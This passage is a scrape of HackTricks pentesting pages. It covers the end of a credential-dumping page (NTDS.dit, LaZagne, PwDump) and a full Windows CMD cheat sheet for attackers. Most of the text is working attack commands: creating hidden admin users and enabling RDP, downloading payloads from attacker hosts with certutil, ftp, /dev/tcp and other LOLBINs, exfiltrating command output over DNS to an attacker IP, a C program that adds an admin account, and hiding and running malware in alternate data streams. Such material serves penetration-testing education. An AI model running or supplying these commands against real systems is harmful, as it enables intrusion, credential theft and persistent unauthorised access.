with\nntdsdotsqlite\n. Not only secrets are extracted but also the entire objects and their attributes for further information extraction when the raw NTDS.dit file is already retrieved.\nntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive\nThe\nSYSTEM\nhive is optional but allow for secrets decryption (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Along with other information, the following data is extracted : user and machine accounts with their hashes, UAC flags, timestamp for last logon and password change, accounts description, names, UPN, SPN, groups and recursive memberships, organizational units tree and membership, trusted domains with trusts type, direction and attributes...\nLazagne\nDownload the binary from\nhere\n. you can use this binary to extract credentials from several software.\nlazagne.exe all\nOther tools for extracting credentials from SAM and LSASS\nWindows credentials Editor (WCE)\nThis tool can be used to extract credentials from the memory. Download it from:\nhttp://www.ampliasecurity.com/research/windows-credentials-editor/\n‚Äã\nfgdump\nExtract credentials from the SAM file\nYou can find this binary inside Kali, just do: locate fgdump.exe\nfgdump.exe\nPwDump\nExtract credentials from the SAM file\nYou can find this binary inside Kali, just do: locate pwdump.exe\nPwDump.exe -o outpwdump -x 127.0.0.1\ntype outpwdump\nPwDump7\nDownload it from:\nhttp://www.tarasco.org/security/pwdump_7\nand just\nexecute it\nand the passwords will be extracted.\nDefenses\n‚Äã\nLearn about some credentials protections here.\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nWmicExec\nNext\nWindows Credentials Protections\nLast modified\n2mo ago"
    },
    {
        "title": "Basic Win CMD for Pentesters",
        "url": "https://book.hacktricks.xyz/windows-hardening/basic-cmd-for-pentesters",
        "text": "Basic Win CMD for Pentesters\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nSystem info\nVersion and Patches info\nwmic os get osarchitecture\n||\necho\n%PROCESSOR_ARCHITECTURE%\n#Get architecture\nsysteminfo\nsysteminfo\n|\nfindstr /B /C:\n\"OS Name\"\n/C:\n\"OS Version\"\n#Get only that information\nwmic computersystem LIST full\n#Get PC info\n‚Äã\nwmic qfe get Caption,Description,HotFixID,InstalledOn\n#Patches\nwmic qfe list brief\n#Updates\n‚Äã\nhostname\n‚Äã\nDRIVERQUERY\n#3rd party driver vulnerable?\nEnvironment\nset\n#List all environment variables\nSome env variables to highlight:\nCOMPUTERNAME\n: Name of the computer\nTEMP/TMP:\nTemp folder\nUSERNAME:\nYour username\nHOMEPATH/USERPROFILE:\nHome directory\nwindir:\nC:\\Windows\nOS\n:Windos OS\nLOGONSERVER\n: Name of domain controller\nUSERDNSDOMAIN\n: Domain name to use with DNS\nUSERDOMAIN\n: Name of the domain\nnslookup\n%LOGONSERVER%.%USERDNSDOMAIN%\n#DNS request for DC\nMounted disks\n(\nwmic logicaldisk get caption\n2\n>\nnul\n|\nmore\n)\n||\n(\nfsutil fsinfo drives\n2\n>\nnul\n)\nwmic logicaldisk get caption,description,providername\n‚Äã\nDefender\n‚Äã\nRecycle Bin\ndir\nC:\n\\\n$Recycle\n.Bin /s /b\nProcesses, Services & Software\nschtasks /query /fo LIST /v\n#Verbose out of scheduled tasks\nschtasks /query /fo LIST\n2\n>\nnul\n|\nfindstr TaskName\nschtasks /query /fo LIST /v\n>\nschtasks.txt\n;\ncat\nschtask.txt\n|\ngrep\n\"SYSTEM\\|Task To Run\"\n|\ngrep\n-B\n1\nSYSTEM\ntasklist /V\n#List processes\ntasklist /SVC\n#links processes to started services\nnet start\n#Windows Services started\nwmic\nservice\nlist brief\n#List services\nsc query\n#List of services\ndir\n/a\n\"C:\\Program Files\"\n#Installed software\ndir\n/a\n\"C:\\Program Files (x86)\"\n#Installed software\nreg query HKEY_LOCAL_MACHINE\n\\\nSOFTWARE\n#Installed software\nDomain info\n# Generic AD info\necho\n%USERDOMAIN%\n#Get domain name\necho\n%USERDNSDOMAIN%\n#Get domain name\necho\n%logonserver%\n#Get name of the domain controller\nset\nlogonserver\n#Get name of the domain controller\nset\nlog\n#Get name of the domain controller\ngpresult /V\n# Get current policy applied\nwmic ntdomain list /format:list\n#Displays information about the Domain and Domain Controllers\n‚Äã\n# Users\ndsquery user\n#Get all users\nnet user /domain\n#List all users of the domain\nnet user\n<\nACCOUNT_NAME\n>\n/domain\n#Get information about that user\nnet accounts /domain\n#Password and lockout policy\nwmic useraccount list /format:list\n#Displays information about all local accounts and any domain accounts that have logged into the device\nwmic /NAMESPACE:\n\\\\\nroot\n\\\ndirectory\n\\\nldap\nPATH\nds_user GET ds_samaccountname\n#Get all users\nwmic /NAMESPACE:\n\\\\\nroot\n\\\ndirectory\n\\\nldap\nPATH\nds_user where\n\"ds_samaccountname='user_name'\"\nGET\n# Get info of 1 users\nwmic sysaccount list /format:list\n#¬†Dumps information about any system accounts that are being used as service accounts.\n‚Äã\n# Groups\nnet group /domain\n#List of domain groups\nnet localgroup administrators /domain\n#List uses that belongs to the administrators group inside the domain (the group \"Domain Admins\" is included here)\nnet group\n\"Domain Admins\"\n/domain\n#List users with domain admin privileges\nnet group\n\"domain computers\"\n/domain\n#List of PCs connected to the domain\nnet group\n\"Domain Controllers\"\n/domain\n#List PC accounts of domains controllers\nwmic group list /format:list\n# Information about all local groups\nwmic /NAMESPACE:\n\\\\\nroot\n\\\ndirectory\n\\\nldap\nPATH\nds_group GET ds_samaccountname\n#Get all groups\nwmic /NAMESPACE:\n\\\\\nroot\n\\\ndirectory\n\\\nldap\nPATH\nds_group where\n\"ds_samaccountname='Domain Admins'\"\nGet ds_member /Value\n#Members of the group\nwmic path win32_groupuser where\n(\ngroupcomponent\n=\n\"win32_group.name=\"\ndomain admins\n\",domain=\"\nDOMAIN_NAME\n\"\"\n)\n#Members of the group\n‚Äã\n# Computers\ndsquery computer\n#Get all computers\nnet view /domain\n#Lis of PCs of the domain\nnltest /dclist:\n<\nDOMAIN\n>\n#List domain controllers\nwmic /NAMESPACE:\n\\\\\nroot\n\\\ndirectory\n\\\nldap\nPATH\nds_computer GET ds_samaccountname\n#All computers\nwmic /NAMESPACE:\n\\\\\nroot\n\\\ndirectory\n\\\nldap\nPATH\nds_computer GET ds_dnshostname\n#All computers\n‚Äã\n# Trust relations\nnltest /domain_trusts\n#Mapping of the trust relationships\n‚Äã\n# Get all objects inside an OU\ndsquery *\n\"CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\nLogs & Events\n#Make a security query using another credentials\nwevtutil qe security /rd:true /f:text /r:helpline /u:HELPLINE\n\\\nzachary /p:0987654321\nUsers & Groups\nUsers\n#Me\nwhoami\n/all\n#All info about me, take a look at the enabled tokens\nwhoami\n/priv\n#Show only privileges\n‚Äã\n# Local users\nnet\nusers\n#All users\ndir\n/b /ad\n\"C:\\Users\"\nnet user %username%\n#Info about a user (me)\nnet accounts\n#Information about password requirements\nwmic USERACCOUNT Get Domain,Name,Sid\nnet user /add\n[\nusername\n]\n[\npassword\n]\n#Create user\n‚Äã\n# Other users looged\nqwinsta\n#Anyone else logged in?\n‚Äã\n#Lauch new cmd.exe with new creds (to impersonate in network)\nrunas /netonly /user\n<\nDOMAIN\n>\n\\\n<\nNAME\n>\n\"cmd.exe\"\n::The password will be prompted\n‚Äã\n#Check current logon session as administrator using logonsessions from sysinternals\nlogonsessions.exe\nlogonsessions64.exe\nGroups\n#Local\nnet localgroup\n#All available groups\nnet localgroup Administrators\n#Info about a group (admins)\nnet localgroup administrators\n[\nusername\n]\n/add\n#Add user to administrators\n‚Äã\n#Domain\nnet group /domain\n#Info about domain groups\nnet group /domain\n<\ndomain_group_name\n>\n#Users that belongs to the group\nList sessions\nqwinsta\nklist sessions\nPassword Policy\nnet accounts\nCredentials\ncmdkey /list\n#List credential\nvaultcmd /listcreds:\n\"Windows Credentials\"\n/all\n#List Windows vault\nrundll32 keymgr.dll, KRShowKeyMgr\n#You need graphical access\nPersistence with users\n# Add domain user and put them in Domain Admins group\nnet user username password /ADD /DOMAIN\nnet group\n\"Domain Admins\"\nusername /ADD /DOMAIN\n‚Äã\n# Add local user and put them local Administrators group\nnet user username password /ADD\nnet localgroup Administrators username /ADD\n‚Äã\n# Add user to insteresting groups:\nnet localgroup\n\"Remote Desktop Users\"\nUserLoginName  /add\nnet localgroup\n\"Debugger users\"\nUserLoginName /add\nnet localgroup\n\"Power users\"\nUserLoginName /add\nNetwork\nInterfaces, Routes, Ports, Hosts and DNSCache\nipconfig /all\n#Info about interfaces\nroute print\n#Print available routes\narp\n-a\n#Know hosts\nnetstat\n-ano\n#Opened ports?\ntype\nC:\n\\\nWINDOWS\n\\\nSystem32\n\\\ndrivers\n\\\netc\n\\\nhosts\nipconfig /displaydns\n|\nfindstr\n\"Record\"\n|\nfindstr\n\"Name Host\"\nFirewall\nnetsh firewall show state\n# FW info, open ports\nnetsh advfirewall firewall show rule\nname\n=\nall\nnetsh firewall show config\n# FW info\nNetsh Advfirewall show allprofiles\n‚Äã\nNetSh Advfirewall\nset\nallprofiles state off\n#Turn Off\nNetSh Advfirewall\nset\nallprofiles state on\n#Trun On\nnetsh firewall\nset\nopmode disable\n#Turn Off\n‚Äã\n#How to open ports\nnetsh advfirewall firewall\nadd\nrule\nname\n=\n\"NetBIOS UDP Port 138\"\ndir\n=\nout\naction\n=\nallow\nprotocol\n=\nUDP\nlocalport\n=\n138\nnetsh advfirewall firewall\nadd\nrule\nname\n=\n\"NetBIOS TCP Port 139\"\ndir\n=\nin\naction\n=\nallow\nprotocol\n=\nTCP\nlocalport\n=\n139\nnetsh firewall\nadd\nportopening TCP\n3389\n\"Remote Desktop\"\n‚Äã\n#Enable Remote Desktop\nreg\nadd\n\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"\n/v fDenyTSConnections /t REG_DWORD /d\n0\n/f\nnetsh firewall\nadd\nportopening TCP\n3389\n\"Remote Desktop\"\n::netsh firewall\nset\nservice\nremotedesktop\nenable\n#I found that this line is not needed\n::sc config TermService\nstart\n=\nauto\n#I found that this line is not needed\n::net start Termservice\n#I found that this line is not needed\n‚Äã\n#Enable Remote Desktop with wmic\nwmic rdtoggle where\nAllowTSConnections\n=\n\"0\"\ncall SetAllowTSConnections\n\"1\"\n##or\nwmic /node:remotehost path Win32_TerminalServiceSetting where\nAllowTSConnections\n=\n\"0\"\ncall SetAllowTSConnections\n\"1\"\n‚Äã\n#Enable Remote assistance:\nreg\nadd\n‚ÄúHKEY_LOCAL_MACHINE\n\\\nSYSTEM\n\\\nCurrentControlSet\n\\\nControl\n\\\nTerminal Server‚Äù /v fAllowToGetHelp /t REG_DWORD /d\n1\n/f\nnetsh firewall\nset\nservice\nremoteadmin\nenable\n‚Äã\n#Ninja combo (New Admin User, RDP + Rassistance + Firewall allow)\nnet user hacker Hacker123\n!\n/add\n&\nnet localgroup administrators hacker /add\n&\nnet localgroup\n\"Remote Desktop Users\"\nhacker /add\n&\nreg\nadd\n\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"\n/v fDenyTSConnections /t REG_DWORD /d\n0\n/f\n&\nreg\nadd\n\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"\n/v fAllowToGetHelp /t REG_DWORD /d\n1\n/f\n&\nnetsh firewall\nadd\nportopening TCP\n3389\n\"Remote Desktop\"\n&\nnetsh firewall\nset\nservice\nremoteadmin\nenable\n‚Äã\n::Connect to RDP\n(\nusing\nhash\nor password\n)\nxfreerdp /u:alice /d:WORKGROUP /pth:b74242f37e47371aff835a6ebcac4ffe /v:10.11.1.49\nxfreerdp /u:hacker /d:WORKGROUP /p:Hacker123\n!\n/v:10.11.1.49\nShares\nnet view\n#Get a list of computers\nnet view /all /domain\n[\ndomainname\n]\n#Shares on the domains\nnet view\n\\\\\ncomputer /ALL\n#List shares of a computer\nnet use x:\n\\\\\ncomputer\n\\\nshare\n#Mount the share locally\nnet share\n#Check current shares\nWifi\nnetsh wlan show profile\n#AP SSID\nnetsh wlan show profile\n<\nSSID\n>\nkey\n=\nclear\n#Get Cleartext Pass\nSNMP\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /s\nNetwork Interfaces\nipconfig /all\nARP table\narp\n-A\nDownload\nBitsadmin.exe\nbitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1\nCertReq.exe\nCertReq -Post -config https://example.org/ c:\\windows\\win.ini output.txt\nCertutil.exe\ncertutil.exe -urlcache -split -f \"http://10.10.14.13:8000/shell.exe\" s.exe\nDesktopimgdownldr.exe\nset \"SYSTEMROOT=C:\\Windows\\Temp\" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr\nDiantz.exe\ndiantz.exe \\\\remotemachine\\pathToFile\\file.exe c:\\destinationFolder\\file.cab\nEsentutl.exe\nesentutl.exe /y \\\\live.sysinternals.com\\tools\\adrestore.exe /d \\\\otherwebdavserver\\webdav\\adrestore.exe /o\nExpand.exe\nexpand \\\\webdav\\folder\\file.bat c:\\ADS\\file.bat\nExtrac32.exe\nextrac32 /Y /C \\\\webdavserver\\share\\test.txt C:\\folder\\test.txt\nFindstr.exe\nfindstr /V /L W3AllLov3DonaldTrump \\\\webdavserver\\folder\\file.exe > c:\\ADS\\file.exe\nFtp.exe\ncmd.exe /c \"@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v\"\nGfxDownloadWrapper.exe\nC:\\Windows\\System32\\DriverStore\\FileRepository\\igdlh64.inf_amd64_[0-9]+\\GfxDownloadWrapper.exe \"URL\" \"DESTINATION FILE\"\nHh.exe\nHH.exe http://some.url/script.ps1\nIeexec.exe\nieexec.exe http://x.x.x.x:8080/bypass.exe\nMakecab.exe\nmakecab \\\\webdavserver\\webdav\\file.exe C:\\Folder\\file.cab\nMpCmdRun.exe\nMpCmdRun.exe -DownloadFile -url <URL> -path <path> //Windows Defender executable\nReplace.exe\nreplace.exe \\\\webdav.host.com\\foo\\bar.exe c:\\outdir /A\nExcel.exe\nExcel.exe http://192.168.1.10/TeamsAddinLoader.dll\nPowerpnt.exe\nPowerpnt.exe \"http://192.168.1.10/TeamsAddinLoader.dll\"\nSquirrel.exe\nsquirrel.exe --download [url to package]\nUpdate.exe\nUpdate.exe --download [url to package]\nWinword.exe\nwinword.exe \"http://192.168.1.10/TeamsAddinLoader.dll\"\nWsl.exe\nwsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'\nMisc\ncd\n#Get current dir\ncd\nC:\n\\\npath\n\\\nto\n\\\ndir\n#Change dir\ndir\n#List current dir\ndir\n/a:h C:\n\\\npath\n\\\nto\n\\\ndir\n#List hidden files\ndir\n/s /b\n#Recursive list without shit\ntime\n#Get current time\ndate\n#Get current date\nshutdown\n/r /t\n0\n#Shutdown now\ntype\n<\nfile\n>\n#Cat file\n‚Äã\n#Runas\nrunas /savecred /user:WORKGROUP\n\\\nAdministrator\n\"\n\\\\\n10.XXX.XXX.XXX\\SHARE\n\\e\nvil.exe\"\n#Use saved credentials\nrunas /netonly /user:\n<\nDOMAIN\n>\n\\\n<\nNAME\n>\n\"cmd.exe\"\n::The password will be prompted\n‚Äã\n#Hide\nattrib +h\nfile\n#Set Hidden\nattrib\n-h\nfile\n#Quit Hidden\n‚Äã\n#Give full control over a file that you owns\nicacls\n<\nFILE_PATH\n>\n/t /e /p\n<\nUSERNAME\n>\n:F\nicacls\n<\nFILE_PATH\n>\n/e /r\n<\nUSERNAME\n>\n#Remove the permision\n‚Äã\n#Recursive copy to smb\nxcopy /hievry C:\n\\\nUsers\n\\\nsecurity\n\\\n.yawcam\n\\\\\n10.10\n.14.13\n\\\nname\n\\\nwin\n‚Äã\n#exe2bat to transform exe file in bat file\n‚Äã\n#ADS\ndir\n/r\n#Detect ADS\nmore\nfile.txt:ads.txt\n#read ADS\npowershell\n(\nGet-Content file.txt\n-Stream\nads.txt\n)\n‚Äã\n# Get error messages from code\nnet helpmsg\n32\n#32 is the code in that case\nBypass Char Blacklisting\necho\n%HOMEPATH:~6,-11%\n#\\\nwho^ami\n#whoami\nDOSfuscation\nGenerates an obfuscated CMD line\ngit clone https:\n//\ngithub\n.\ncom/danielbohannon/\nInvoke-DOSfuscation\n.\ngit\ncd\nInvoke-DOSfuscation\nImport-Module\n.\n\\\nInvoke-DOSfuscation\n.\npsd1\nInvoke-DOSfuscation\nhelp\nSET\nCOMMAND\ntype\nC:\\Users\\Administrator\\Desktop\\flag\n.\ntxt\nencoding\nListen address ACLs\nYou can listen on\nhttp://+:80/Temporary_Listen_Addresses/\nwithout being administrator.\nnetsh http show urlacl\nManual DNS shell\nAttacker\n(Kali) must use one of these 2 options:\nsudo\nresponder\n-I\n<\niface\n>\n#Active\nsudo\ntcpdump\n-i\n<\niface\n>\n-A\nproto udp and dst port\n53\nand dst\nip\n<\nKALI_IP\n>\n#Passive\nVictim\nfor /f tokens\n_**_technique: This allows us to execute commands, get the first X words of each line and send it through DNS to our server\nfor /f %a in ('whoami') do nslookup %a <IP_kali> #Get whoami\nfor /f \"tokens=2\" %a in ('echo word1 word2') do nslookup %a <IP_kali> #Get word2\nfor /f \"tokens=1,2,3\" %a in ('dir /B C:\\') do nslookup %a.%b.%c <IP_kali> #List folder\nfor /f \"tokens=1,2,3\" %a in ('dir /B \"C:\\Program Files (x86)\"') do nslookup %a.%b.%c <IP_kali> #List that folder\nfor /f \"tokens=1,2,3\" %a in ('dir /B \"C:\\Progra~2\"') do nslookup %a.%b.%c <IP_kali> #Same as last one\n#More complex commands\nfor /f \"tokens=1,2,3,4,5,6,7,8,9\" %a in ('whoami /priv ^| findstr /i \"enable\"') do nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i <IP_kali> #Same as last one\nYou can also\nredirect\nthe output, and then\nread\nit.\nwhoami /priv | finstr \"Enab\" > C:\\Users\\Public\\Documents\\out.txt\nfor /f \"tokens=1,2,3,4,5,6,7,8,9\" %a in ('type \"C:\\Users\\Public\\Documents\\out.txt\"') do nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i <IP_kali>\nCalling CMD from C code\n#\ninclude\n<stdlib.h>\n/* system, NULL, EXIT_FAILURE */\n‚Äã\n// When executed by Administrator this program will create a user and then add him to the administrators group\n// i686-w64-mingw32-gcc addmin.c -o addmin.exe\n// upx -9 addmin.exe\n‚Äã\nint\nmain\n(){\nint\ni\n;\ni\n=\nsystem\n(\n\"net users otherAcc 0TherAcc! /add\"\n);\ni\n=\nsystem\n(\n\"net localgroup administrators otherAcc /add\"\n);\nreturn\n0\n;\n}\nAlternate Data Streams CheatSheet (ADS/Alternate Data Stream)\nTaken from\nhttps://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\n‚Äã\n##Add content to ADS###\ntype\nC:\n\\\ntemp\n\\\nevil.exe\n>\n\"C:\\Program Files (x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe\"\nextrac32 C:\n\\\nADS\n\\\nprocexp.cab c:\n\\\nADS\n\\\nfile.txt:procexp.exe\nfindstr /V /L W3AllLov3DonaldTrump c:\n\\\nADS\n\\\nprocexp.exe\n>\nc:\n\\\nADS\n\\\nfile.txt:procexp.exe\ncertutil.exe\n-urlcache\n-split\n-f\nhttps://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\n\\\ntemp:ttt\nmakecab c:\n\\\nADS\n\\\nautoruns.exe c:\n\\\nADS\n\\\ncabtest.txt:autoruns.cab\nprint /D:c:\n\\\nads\n\\\nfile.txt:autoruns.exe c:\n\\\nads\n\\\nAutoruns.exe\nreg\nexport\nHKLM\n\\\nSOFTWARE\n\\\nMicrosoft\n\\\nEvilreg c:\n\\\nads\n\\\nfile.txt:evilreg.reg\nregedit /E c:\n\\\nads\n\\\nfile.txt:regfile.reg HKEY_CURRENT_USER\n\\\nMyCustomRegKey\nexpand\n\\\\\nwebdav\n\\\nfolder\n\\\nfile.bat c:\n\\\nADS\n\\\nfile.txt:file.bat\nesentutl.exe /y C:\n\\\nADS\n\\\nautoruns.exe /d c:\n\\\nADS\n\\\nfile.txt:autoruns.exe /o\npowershell\n-command\n\" & {(Get-Content C:\\ADS\n\\f\nile.exe -Raw | Set-Content C:\\ADS\n\\f\nile.txt -Stream file.exe)}\"\ncurl\nfile://c:/temp/autoruns.exe\n--output\nc:\n\\\ntemp\n\\\ntextfile1.txt:auto.exe\ncmd.exe /c\necho\nregsvr32.exe ^/s ^/u ^/i:https://evilsite.com/RegSvr32.sct   ^scrobj.dll\n>\nfakefile.doc:reg32.bat\nset-content - path\n{\npath to the file\n}\n- stream\n{\nname of the stream\n}\n‚Äã\n## Discover ADS contecnt\ndir\n/R\nstreams.exe\n<\nc:\n\\\npath\n\\\nto\n\\\nfile\n>\n#Binary from sysinternals#\nGet-Item\n-Path\n.\n\\\nfie.txt\n-Stream\n*\ngci\n-recurse\n|\n%\n{\ngi\n$_\n.FullName\n-stream\n*\n}\n|\nwhere stream\n-ne\n':$Data'\n‚Äã\n##Extract content from ADS###\nexpand\nc:\n\\\nads\n\\\nfile.txt:test.exe c:\n\\\ntemp\n\\\nevil.exe\nesentutl.exe /Y C:\n\\\ntemp\n\\\nfile.txt:test.exe /d c:\n\\\ntemp\n\\\nevil.exe /o\nmore\n<\nc:\n\\\nads\n\\\nfile.txt:test.exe\n‚Äã\n##Executing the ADS content###\n‚Äã\n* WMIC\nwmic process call create\n'\"C:\\Program Files (x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe\"'\n‚Äã\n* Rundll32\nrundll32\n\"C:\\Program Files (x86)\\TeamViewer\\TeamViewer13_Logfile.log:ADSDLL.dll\"\n,DllMain\nrundll32.exe advpack.dll,RegisterOCX not_a_dll.txt:test.dll\nrundll32.exe ieadvpack.dll,RegisterOCX not_a_dll.txt:test.dll\n‚Äã\n* Cscript\ncscript\n\"C:\\Program Files (x86)\\TeamViewer\\TeamViewer13_Logfile.log:Script.vbs\"\n‚Äã\n* Wscript\nwscript c:\n\\\nads\n\\\nfile.txt:script.vbs\necho\nGetObject\n(\n\"script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js\"\n)\n>\n%temp%\n\\\ntest.txt:hi.js\n&&\nwscript.exe %temp%\n\\\ntest.txt:hi.js\n‚Äã\n* Forfiles\nforfiles /p c:\n\\\nwindows\n\\\nsystem32 /m notepad.exe /c\n\"c:\n\\t\nemp\\shellloader.dll:bginfo.exe\"\n‚Äã\n* Mavinject.exe\nc:\n\\\nwindows\n\\\nSysWOW64\n\\\nnotepad.exe\ntasklist\n|\nfindstr notepad\nnotepad.exe\n4172\n31C5CE94259D4006\n2\n18,476\nK\ntype\nc:\n\\\ntemp\n\\\nAtomicTest.dll\n>\n\"c:\\Program Files (x86)\\TeamViewer\\TeamViewer13_Logfile.log:Atomic.dll\"\nc:\n\\\nwindows\n\\\nWinSxS\n\\\nwow64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.16299.15_none_e07aa28c97ebfa48\n\\\nmavinject.exe\n4172\n/INJECTRUNNING\n\"c:\\Program Files (x86)\\TeamViewer\\TeamViewer13_Logfile.log:Atomic.dll\"\n‚Äã\n* MSHTA\nmshta\n\"C:\\Program Files (x86)\\TeamViewer\\TeamViewer13_Logfile.log:helloworld.hta\"\n(\nDoes not work on Windows\n10\n1903\nand newer\n)\n‚Äã\n* Control.exe\ncontrol.exe c:\n\\\nwindows\n\\\ntasks\n\\\nzzz:notepad_reflective_x64.dll\nhttps://twitter.com/bohops/status/954466315913310209\n‚Äã\n* Create\nservice\nand run\nsc create evilservice\nbinPath\n=\n\"\n\\\"\nc:\\ADS\n\\f\nile.txt:cmd.exe\n\\\"\n/c echo works >\n\\\"\nc:\\ADS\\works.txt\n\\\"\n\"\nDisplayName\n=\n\"evilservice\"\nstart\n=\nauto\nsc start evilservice\nhttps://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/\n‚Äã\n* Powershell.exe\npowershell\n-ep\nbypass -\n<\nc:\n\\\ntemp:ttt\n‚Äã\n* Powershell.exe\npowershell\n-command\n\" & {(Get-Content C:\\ADS\n\\1\n.txt -Stream file.exe -Raw | Set-Content c:\\ADS\n\\f\nile.exe) | start-process c:\\ADS\n\\f\nile.exe}\"\n‚Äã\n* Powershell.exe\nInvoke-CimMethod\n-ClassName\nWin32_Process\n-MethodName\nCreate\n-Arguments\n@\n{\nCommandLine\n=\nC:\n\\\nads\n\\\nfolder:file.exe\n}\n‚Äã\n* Regedit.exe\nregedit c:\n\\\nads\n\\\nfile.txt:regfile.reg\n‚Äã\n* Bitsadmin.exe\nbitsadmin /create myfile\nbitsadmin /addfile myfile c:\n\\\nwindows\n\\\nsystem32\n\\\nnotepad.exe c:\n\\\ndata\n\\\nplayfolder\n\\\nnotepad.exe\nbitsadmin /SetNotifyCmdLine myfile c:\n\\\nADS\n\\\n1\n.txt:cmd.exe NULL\nbitsadmin /RESUME myfile\n‚Äã\n* AppVLP.exe\nAppVLP.exe c:\n\\\nwindows\n\\\ntracing\n\\\ntest.txt:ha.exe\n‚Äã\n* Cmd.exe\ncmd.exe -\n<\nfakefile.doc:reg32.bat\nhttps://twitter.com/yeyint_mth/status/1143824979139579904\n‚Äã\n* Ftp.exe\nftp\n-s:fakefile.txt:aaaa.txt\nhttps://github.com/sailay1996/misc-bin/blob/master/ads.md\n‚Äã\n* ieframe.dll , shdocvw.dll\n(\nads\n)\necho\n[\ninternetshortcut\n]\n>\nfake.txt:test.txt\n&&\necho\nurl\n=\nC:\n\\\nwindows\n\\\nsystem32\n\\\ncalc.exe\n>>\nfake.txt:test.txt rundll32.exe ieframe.dll,OpenURL C:\n\\\ntemp\n\\\nads\n\\\nfake.txt:test.txt\nrundll32.exe shdocvw.dll,OpenURL C:\n\\\ntemp\n\\\nads\n\\\nfake.txt:test.txt\nhttps://github.com/sailay1996/misc-bin/blob/master/ads.md\n‚Äã\n* bash.exe\necho\ncalc\n>\nfakefile.txt:payload.sh\n&&\nbash\n<\nfakefile.txt:payload.sh\nbash.exe\n-c\n$(\nfakefile.txt:payload.sh\n)\nhttps://github.com/sailay1996/misc-bin/blob/master/ads.md\n‚Äã\n* Regsvr32\ntype\nc:\n\\\nWindows\n\\\nSystem32\n\\\nscrobj.dll\n>\nTextfile.txt:LoveADS\nregsvr32 /s /u /i:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Regsvr32_calc.sct Textfile.txt:LoveADS\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nWTS Impersonator\nNext\n- Windows Hardening\nBasic PowerShell for Pentesters\nLast modified\n6mo ago"
    },
    {
        "title": "Basic PowerShell for Pentesters",
        "url": "https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters",
